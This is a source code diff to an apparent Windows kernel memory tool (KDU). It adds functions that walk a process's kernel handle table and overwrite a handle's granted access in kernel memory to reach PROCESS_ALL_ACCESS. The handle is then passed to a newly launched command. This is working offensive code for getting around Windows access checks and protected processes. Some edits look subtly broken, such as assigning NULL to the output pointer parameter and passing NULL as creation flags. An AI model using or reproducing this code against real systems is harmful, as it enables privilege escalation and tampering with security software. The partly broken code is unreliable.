@@ -30,6 +30,15 @@ typedef BOOL(WINAPI* pfnMiniDumpWriteDump)(
     _In_opt_ PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
     _In_opt_ PMINIDUMP_CALLBACK_INFORMATION CallbackParam);
 
+BOOL KDUVerifyProviderCallbacksForOpenProcess(
+    _In_ PKDU_CONTEXT Context
+)
+{
+    if (Context->Provider->Callbacks.OpenProcess == NULL)
+        return FALSE;
+    return TRUE;
+}
+
 LPCSTR KDUGetProtectionTypeAsString(
     _In_ ULONG Type
 )
@@ -80,6 +89,11 @@ BOOL KDUDumpProcessMemory(
     HANDLE hFile = INVALID_HANDLE_VALUE;
     HANDLE processHandle = NULL;
     pfnMiniDumpWriteDump pMiniDumpWriteDump;
+
+	if (!KDUVerifyProviderCallbacksForOpenProcess(Context)) {
+		supPrintfEvent(kduEventError, "Provider does not support OpenProcess callback\r\n");
+		return FALSE;
+	}
 
     WCHAR szOutputName[MAX_PATH];
     PSYSTEM_PROCESS_INFORMATION procEntry = NULL;
@@ -327,6 +341,8 @@ BOOL KDUGetEprocessOffsets(
     Offsets->PsProtectionOffset = 0;
     Offsets->MitigationFlags1Offset = 0;
     Offsets->MitigationFlags2Offset = 0;
+    Offsets->ObjectHandleOffset = 0;
+	Offsets->HandleTableOffset = 0;
 
     switch (NtBuildNumber) {
 
@@ -389,6 +405,8 @@ BOOL KDUGetEprocessOffsets(
         Offsets->PsProtectionOffset = PsProtectionOffset_26100;
         Offsets->MitigationFlags1Offset = PsMitigationFlags1Offset_26100;
         Offsets->MitigationFlags2Offset = PsMitigationFlags2Offset_26100;
+		Offsets->ObjectHandleOffset = ObjectTableOffset_26100;
+		Offsets->HandleTableOffset = HandleTableOffset_26100;
         break;
 
     default:
@@ -686,6 +704,214 @@ BOOL KDUControlProcessMitigationFlags(
     return bResult1 && bResult2;
 }
 
+ULONG_PTR LookupHandleEntry(
+    _In_ PKDU_CONTEXT Context,
+    ULONG_PTR HandleTable,
+    HANDLE HandleValue,
+	KDU_EPROCESS_OFFSETS offsets
+)
+{
+    ULONG_PTR TableCode;
+    ULONG_PTR Level;
+    ULONG_PTR Base;
+    ULONG_PTR Index;
+
+	// get the redirection level and base address from the handle table
+    if (!Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+        HANDLE_TABLE_OFFSET(HandleTable, offsets.HandleTableOffset),
+        &TableCode,
+        sizeof(ULONG_PTR)))
+    {
+        return 0;
+    }
+
+    Level = TableCode & 3;
+    Base = TableCode & ~3;
+
+    Index = ((ULONG_PTR)HandleValue) >> 2;
+
+    switch (Level)
+    {
+    case 0:
+    {
+        return Base + (Index * sizeof(HANDLE_TABLE_ENTRY));
+    }
+
+    case 1:
+    {
+        ULONG_PTR Mid;
+
+        if (!Context->Provider->Callbacks.ReadKernelVM(
+            Context->DeviceHandle,
+            Base + ((Index >> 8) * sizeof(ULONG_PTR)),
+            &Mid,
+            sizeof(Mid))) {
+            return 0;
+        }
+
+        return Mid + ((Index & 0xFF) * sizeof(HANDLE_TABLE_ENTRY));
+    }
+
+    case 2:
+    {
+        ULONG_PTR L1;
+        ULONG_PTR L2;
+
+        if (!Context->Provider->Callbacks.ReadKernelVM(
+            Context->DeviceHandle,
+            Base + ((Index >> 16) * sizeof(ULONG_PTR)),
+            &L1,
+            sizeof(L1)))
+        {
+            return 0;
+        }
+
+        if (!Context->Provider->Callbacks.ReadKernelVM(
+            Context->DeviceHandle,
+            L1 + (((Index >> 8) & 0xFF) * sizeof(ULONG_PTR)),
+            &L2,
+            sizeof(L2)))
+        {
+            return 0;
+        }
+
+        return L2 + ((Index & 0xFF) * sizeof(HANDLE_TABLE_ENTRY));
+    }
+    }
+
+    return 0;
+}
+
+/*
+* 
+* KDUControlHandleAccess
+* 
+* Purpose:
+* 
+* Modify an existing handle's access rights
+*/
+BOOL KDUControlHandleAccess(
+    _In_ PKDU_CONTEXT Context,
+    _In_ ULONG_PTR ProcessId,
+    _In_ HANDLE HandleValue,
+    _In_ ACCESS_MASK NewAccessMask)
+{
+	BOOL       bResult = FALSE;
+	NTSTATUS   ntStatus;
+	ULONG_PTR  ProcessObject = 0, HandleTable = 0, HandleEntry = 0;
+	HANDLE     hProcess = NULL;
+	CLIENT_ID clientId;
+	OBJECT_ATTRIBUTES obja;
+	KDU_EPROCESS_OFFSETS offsets;
+	
+    if (!KDUVerifyProviderCallbacksForPsPatch(Context)) {
+		printf_s("[!] Provider does not support required callbacks for handle access control\r\n");
+        return FALSE;
+    }
+
+    if (!KDUGetEprocessOffsets(Context->NtBuildNumber, &offsets) ||
+        offsets.ObjectHandleOffset == 0)
+    {
+        supPrintfEvent(kduEventError, 
+            "[!] Unsupported WinNT version\r\n");
+        return FALSE;
+    }
+
+	FUNCTION_ENTER_MSG(__FUNCTION__);
+	InitializeObjectAttributes(&obja, NULL, 0, 0, 0);
+	clientId.UniqueProcess = (HANDLE)ProcessId;
+	clientId.UniqueThread = NULL;
+	
+    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
+		&obja, &clientId);
+	
+    if (NT_SUCCESS(ntStatus)) {
+		printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
+		bResult = supQueryObjectFromHandle(hProcess, &ProcessObject);
+		
+        if (bResult && (ProcessObject != 0)) {
+			printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);
+			
+            // read the ObjectTable pointer from the EPROCESS structure
+			if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+				EPROCESS_TO_OBJECTTABLE(ProcessObject, offsets.ObjectHandleOffset),
+				&HandleTable,
+				sizeof(ULONG_PTR))) 
+            {
+				printf_s("[+] ObjectTable pointer read: 0x%llX\r\n", HandleTable);
+
+                // parse the layer type
+				HandleEntry = LookupHandleEntry(Context, HandleTable, HandleValue, offsets);
+				if (HandleEntry != 0) {
+				    printf_s("[+] HandleEntry pointer read: 0x%llX\r\n", HandleEntry);
+
+				    // read the current access rights from the HandleTableEntry
+				    HANDLE_TABLE_ENTRY entry = { 0 };
+                    if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+                        HandleEntry,
+                        &entry,
+                        sizeof(entry)))
+                    {
+                        printf_s("[+] Current Handle access rights: 0x%lX\r\n", entry.GrantedAccess);
+
+                        // modify the access rights
+                        bResult = Context->Provider->Callbacks.WriteKernelVM(
+                            Context->DeviceHandle,
+                            HandleEntry + offsetof(HANDLE_TABLE_ENTRY, GrantedAccess),
+                            &NewAccessMask,
+                            sizeof(ULONG)
+                        );
+
+                        if (bResult) { // and verify
+                            printf_s("[+] Handle access rights modified successfully.\r\n");
+                            if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+                                HandleEntry,
+                                &entry,
+                                sizeof(entry)))
+                            {
+                                if ((entry.GrantedAccess & NewAccessMask) == NewAccessMask) {
+                                    printf_s("[+] Verified: Handle access rights updated to 0x%lX.\r\n", entry.GrantedAccess);
+                                }
+                                else {
+                                    printf_s("[!] Verification failed: Handle access rights are 0x%lX, expected 0x%lX.\r\n", entry.GrantedAccess, NewAccessMask);
+                                }
+                            }
+                            else {
+                                printf("[!] Failed to read back HandleTableEntry after modification.\r\n");
+                            }
+                        }
+                        else {
+                            supPrintfEvent(kduEventError, "[!] Failed to modify handle access rights\r\n");
+                        }
+                    }
+                    else {
+						supPrintfEvent(kduEventError, "[!] Cannot read HandleTableEntry\r\n");
+                    }
+				}
+				else {
+					supPrintfEvent(kduEventError, "[!] Cannot read HandleTableEntry\r\n");
+				}
+			}
+			else {
+				supPrintfEvent(kduEventError,
+					"[!] Cannot read ObjectTable pointer\r\n");
+			}
+		}
+		else {
+			supPrintfEvent(kduEventError,
+				"[!] Cannot query process object\r\n");
+		}
+		NtClose(hProcess);
+	}
+	else {
+		supShowHardError("[!] Cannot open target process", ntStatus);
+	}
+
+	FUNCTION_LEAVE_MSG(__FUNCTION__);
+
+	return bResult;
+}
+
 /*
 * KDURunCommandDup
 *
@@ -698,32 +924,70 @@ BOOL KDURunCommandDup(
     _In_ PKDU_CONTEXT Context,
     _In_ LPWSTR CommandLine,
     _In_ ULONG_PTR TargetProcessId,
-    _Out_ HANDLE dupHandle)
+    _Out_ HANDLE *dupHandle)
 {
-    BOOL       bResult = FALSE;
-    DWORD      dwThreadResumeCount = 0;
-    dupHandle = { 0 };
+    BOOL   bResult = FALSE;
+	dupHandle = NULL;
 
-    // find csrss.exe with tlhelp and store as SourceProcessId
-    ULONG_PTR SourceProcessId = 0;
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        supShowWin32Error("[!] Failed to create process snapshot", GetLastError());
-        return FALSE;
-    }
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            if (_wcsicmp(pe.szExeFile, L"csrss.exe") == 0) {
-                SourceProcessId = pe.th32ProcessID;
-                break;
+	if (!KDUVerifyProviderCallbacksForOpenProcess(Context)) {
+		printf_s("[!] Provider does not support required callbacks for handle duplication\r\n");
+		return FALSE;
+	}
+
+    HANDLE hTargetProc;
+    if (KDUOpenProcess(Context, (HANDLE)TargetProcessId, PROCESS_ALL_ACCESS, &hTargetProc)) {
+        DWORD flags = 0;
+
+		printf_s("[+] Opened target process with PID %llu\r\n", TargetProcessId);
+        if (GetHandleInformation(hTargetProc, &flags)) {
+            if (flags & HANDLE_FLAG_INHERIT) {
+                printf("[+] Success: The handle %p is inheritable.\n", hTargetProc);
             }
-        } while (Process32Next(hSnapshot, &pe));
+            else {
+                printf("[-] Warning: The handle %p is not inheritable, attempting to set inheritance flag...\n", hTargetProc);
+                if (!SetHandleInformation(hTargetProc, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
+                    printf("[!] Failed to set inheritance flag. Error: %lu\n", GetLastError());
+                    return FALSE;
+                }
+                else {
+                    printf("[+] Successfully toggled HANDLE_FLAG_INHERIT on the handle %p.\n", hTargetProc);
+                }
+            }
+        }
+        else {
+            printf("[!] GetHandleInformation failed. Error: %lu\n", GetLastError());
+        }
     }
-    CloseHandle(hSnapshot);
-    if (SourceProcessId == 0) {
-        printf_s("[!] Failed to find csrss.exe process\n");
+    else {
+		printf("[!] Failed to open target process with PID %llu.", TargetProcessId);
+		return FALSE;
+    }
+
+    // check if handle has PROCESS_FULL_ACCESS rights
+    unsigned char buf[sizeof(OBJECT_BASIC_INFORMATION)] = {};
+    ULONG returnLength;
+
+    NTSTATUS status = NtQueryObject(hTargetProc, ObjectBasicInformation, buf, sizeof(buf), &returnLength);
+    if (status == STATUS_SUCCESS) { 
+        POBJECT_BASIC_INFORMATION pBasicInfo = (POBJECT_BASIC_INFORMATION)buf;
+		if ((pBasicInfo->GrantedAccess & PROCESS_ALL_ACCESS) == PROCESS_ALL_ACCESS) {
+			printf("[+] The handle %p has PROCESS_ALL_ACCESS rights to the target process.\n", hTargetProc);
+		}
+		else {
+			printf("[-] Warning: Handle %p only has access rights: 0x%lX. Attempting to modify...\n", hTargetProc, pBasicInfo->GrantedAccess);
+			
+            // attempt to modify the handle's access rights using KDUControlHandleAccess
+			if (KDUControlHandleAccess(Context, GetCurrentProcessId(), hTargetProc, PROCESS_ALL_ACCESS)) {
+				printf("[+] Success: Modified the KDU handle's access rights to PROCESS_ALL_ACCESS.\n");
+			}
+			else {
+				printf("[!] Failed to modify the KDU handle's access rights.\n");
+				return FALSE;
+			}
+		}
+    }
+    else {
+        printf("[!] Failed to query handle information with status: 0x%lX\n", status);
         return FALSE;
     }
 
@@ -736,14 +1000,14 @@ BOOL KDURunCommandDup(
 
     wprintf_s(L"[+] Creating Process '%s'\r\n", CommandLine);
 
+    // process can be started directly, 
     bResult = CreateProcess(
         NULL,               // No module name (use command line)
         CommandLine,        // Command line
         NULL,               // Process handle not inheritable
         NULL,               // Thread handle not inheritable
-        FALSE,              // Set handle inheritance to FALSE
-        CREATE_SUSPENDED,   // Create Process suspended so we can edit
-        // its protection level prior to starting
+        TRUE,               // Do inherit inheritable handles
+		NULL,               // Create Process running normally
         NULL,               // Use parent's environment block
         NULL,               // Use parent's starting directory 
         &si,                // Pointer to STARTUPINFO structure
@@ -754,18 +1018,6 @@ BOOL KDURunCommandDup(
     }
     printf_s("[+] Created Process with PID %lu\r\n", pi.dwProcessId);
 
-    bResult = KDUDuplicateProcessHandle(Context, pi.hProcess, SourceProcessId, TargetProcessId, &dupHandle);
-    if (!bResult) {
-        supShowWin32Error("[!] Failed to duplicate handle", GetLastError());
-        return bResult;
-    }
-
-    dwThreadResumeCount = ResumeThread(pi.hThread);
-    if (dwThreadResumeCount != 1) {
-        printf_s("[!] Failed to resume process: %lu | 0x%lX\n", dwThreadResumeCount, GetLastError());
-        return bResult;
-    }
-
     // Wait until child process exits.
     WaitForSingleObject(pi.hProcess, INFINITE);
 
@@ -773,167 +1025,5 @@ BOOL KDURunCommandDup(
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
-    return bResult;
-}
-
-// Helper function to find a handle with PROCESS_ALL_ACCESS rights to TargetPid in SourcePid process and return it for duplication
-HANDLE FindProcessHandle(ULONG_PTR sourcePid, HANDLE hTargetProcess, ULONG_PTR targetPid) {
-    printf_s("[*] Searching for a handle with PROCESS_ALL_ACCESS to target process %llu in source process %llu\r\n", targetPid, sourcePid);
-
-    ULONG bufferSize = 0x4000; // Start with a 16KB buffer
-    PVOID buffer = ntsupVirtualAlloc((SIZE_T)bufferSize);
-    if (!buffer) return NULL;
-
-    NTSTATUS ntStatus = NtQuerySystemInformation(
-        (SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
-        buffer,
-        bufferSize,
-        &bufferSize
-    );
-
-    // Reallocate if the process contains more handles than expected
-    if (ntStatus == STATUS_INFO_LENGTH_MISMATCH) {
-        ntsupVirtualFree(buffer);
-
-        buffer = ntsupVirtualAlloc((SIZE_T)bufferSize);
-        if (!buffer) {
-            printf_s("[!] Failed to allocate buffer for handle information\r\n");
-            return NULL;
-        }
-
-        ntStatus = NtQuerySystemInformation(
-            (SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
-            buffer,
-            bufferSize,
-            &bufferSize
-        );
-    }
-
-    if (!NT_SUCCESS(ntStatus)) {
-        if (buffer) ntsupVirtualFree(buffer);
-        printf_s("[!] Failed to query process handle information from source process\r\n");
-        return NULL;
-    }
-
-    printf_s("[*] Source process has %llu handles\r\n", ((PPROCESS_HANDLE_SNAPSHOT_INFORMATION)buffer)->NumberOfHandles);
-
-    HANDLE hFoundHandle = NULL;
-    PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer;
-    PVOID targetEprocessAddress = NULL;
-    ULONG_PTR currentPid = GetCurrentProcessId();
-
-    // Resolve Target Process' kernel EPROCESS address by looking up kdu.exe's open handle
-    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
-        SYSTEM_HANDLE_TABLE_ENTRY_INFO entry = handleInfo->Handles[i];
-
-        if (entry.UniqueProcessId == currentPid) {
-
-            // Match the handle value that KDUOpenProcess gave us for the target
-            if ((HANDLE)(ULONG_PTR)entry.HandleValue == hTargetProcess) {
-                targetEprocessAddress = entry.Object;
-                break;
-            }
-        }
-    }
-    if (targetEprocessAddress == NULL) {
-        printf_s("[!] Failed to resolve target process EPROCESS kernel pointer\r\n");
-        ntsupVirtualFree(buffer);
-        return NULL;
-    }
-
-    printf_s("[*] Resolved target process EPROCESS kernel pointer: 0x%p\n", targetEprocessAddress);
-
-    // Find the handle inside Source Process (csrss.exe) pointing to that kernel address
-    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
-        SYSTEM_HANDLE_TABLE_ENTRY_INFO entry = handleInfo->Handles[i];
-
-        if (entry.UniqueProcessId == sourcePid) { // must be owned by the source process (csrss.exe)
-
-            if (entry.Object == targetEprocessAddress) { // must point to the target process EPROCESS in kernel
-
-                if ((entry.GrantedAccess & PROCESS_ALL_ACCESS) == PROCESS_ALL_ACCESS) {
-
-                    hFoundHandle = (HANDLE)(ULONG_PTR)entry.HandleValue;
-                    printf_s("[+] Found valid handle value! Handle: 0x%p (Access: 0x%lX)\n",
-                        hFoundHandle, entry.GrantedAccess);
-                    break;
-                }
-            }
-        }
-    }
-
-    ntsupVirtualFree(buffer);
-    return hFoundHandle;
-}
-
-/*
-* KDUDuplicateProcessHandle
-*
-* Purpose:
-*
-* Duplicates a process handle with PROCESS_ALL_ACCESS rights to our new process.
-*
-*/
-BOOL KDUDuplicateProcessHandle(
-    _In_ PKDU_CONTEXT Context,
-    _In_ HANDLE hNewProcess,
-    _In_ ULONG_PTR SourceProcessId,
-    _In_ ULONG_PTR TargetProcessId,
-    _Out_ PHANDLE DupHandle
-)
-{
-    BOOL bResult = FALSE;
-    HANDLE hSourceProcess = NULL, hTargetProcess = NULL;
-
-    FUNCTION_ENTER_MSG(__FUNCTION__);
-
-    bResult = KDUOpenProcess(Context, (HANDLE)SourceProcessId, PROCESS_DUP_HANDLE, &hSourceProcess);
-    if (bResult && hSourceProcess != NULL) {
-        printf_s("[+] Process with PID %llu opened (PROCESS_DUP_HANDLE)\r\n", SourceProcessId);
-
-        bResult = KDUOpenProcess(Context, (HANDLE)TargetProcessId, PROCESS_DUP_HANDLE, &hTargetProcess);
-        if (bResult && hTargetProcess != NULL) {
-            printf_s("[+] Process with PID %llu opened (PROCESS_DUP_HANDLE)\r\n", TargetProcessId);
-
-            // search for the handle in sourceProcess with PROCESS_ALL_ACCESS on targetProcess, to duplicate into the newProcess
-            HANDLE hSourceProcessHandleToDup = FindProcessHandle(SourceProcessId, hTargetProcess, TargetProcessId);
-            if (hSourceProcessHandleToDup != NULL) {
-
-                bResult = NtDuplicateObject(hSourceProcess,
-                    hSourceProcessHandleToDup,
-                    hNewProcess,
-                    DupHandle,
-                    PROCESS_ALL_ACCESS,
-                    TRUE,      // OBJ_INHERIT (for the new process to use)
-                    DUPLICATE_SAME_ACCESS
-                );
-                if (bResult) {
-                    printf_s("[+] Duplicated process handle to new process\r\n");
-                }
-                else {
-                    supShowHardError("[!] Failed to duplicate process handle", bResult);
-                    bResult = FALSE;
-                }
-                NtClose(hTargetProcess);
-            }
-            else {
-                printf_s("[!] Failed to find a handle with PROCESS_ALL_ACCESS to target process %llu in source process %llu\n", TargetProcessId, SourceProcessId);
-                bResult = FALSE;
-            }
-        }
-        else {
-            supShowHardError("[!] Cannot open target process", bResult);
-        }
-        NtClose(hSourceProcess);
-    }
-    else {
-        supShowHardError("[!] Cannot open source process", bResult);
-    }
-    FUNCTION_LEAVE_MSG(__FUNCTION__);
-
-    if (!bResult) {
-        printf_s("[!] Handle duplication failed. Check if the source process has a handle with PROCESS_ALL_ACCESS to the target process.\n");
-        *DupHandle = NULL;
-    }
     return bResult;
 }
